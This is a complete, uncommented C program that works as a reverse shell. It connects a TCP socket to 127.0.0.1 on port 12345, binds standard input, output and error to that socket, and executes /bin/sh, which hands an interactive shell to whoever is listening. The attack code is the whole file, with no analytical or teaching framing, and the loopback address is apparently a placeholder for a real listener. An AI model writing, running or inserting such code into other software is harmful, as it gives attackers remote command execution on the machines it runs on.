#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main(int argc, char *argv[])
{
  struct sockaddr_in addr;
  int sock;

  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = inet_addr("127.0.0.1");
  addr.sin_port = htons(12345);

  sock = socket(AF_INET, SOCK_STREAM, 0);
  connect(sock, (struct sockaddr *)&addr, sizeof(addr));
  dup2(sock, 0);
  dup2(sock, 1);
  dup2(sock, 2);

  execve("/bin/sh", 0, 0);

  return 0;
}
